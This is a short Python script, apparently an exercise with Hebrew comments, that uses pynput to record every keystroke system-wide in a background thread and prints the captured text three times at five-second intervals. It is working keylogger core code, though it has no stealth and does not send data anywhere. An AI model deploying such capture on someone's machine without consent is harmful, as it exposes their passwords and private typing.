from pynput import keyboard
import threading
import time

class Listener:
    def __init__(self):
        self.data = []
        self.listener = None
        self.running = False

    def on_press(self, key):
        """פונקציה שמופעלת על כל הקשה"""
        try:
            self.data.append(key.char)
        except:
            if key == keyboard.Key.space:
                self.data.append(" ")
            elif key == keyboard.Key.enter:
                self.data.append("\n")
            else:
                self.data.append(f"<{key}>")  # מקשים מיוחדים

    def run(self):
        """הפעלת המאזין עם join()"""
        self.running = True
        with keyboard.Listener(on_press=self.on_press) as self.listener:
            self.listener.join()
        self.running = False

    def stop(self):
        """עצירה מיידית של המאזין"""
        if self.listener and self.running:
            self.listener.stop()  # מפסיק את join() מיד
            self.running = False

    def get_keys(self):
        text = "".join(self.data)
        self.data.clear()
        return text


if __name__ == "__main__":
    a = Listener()
    t = threading.Thread(target=a.run)
    t.start()
    num = 3
    while num>0:
        time.sleep(5)
        print(a.get_keys())
        num -= 1
    a.stop()
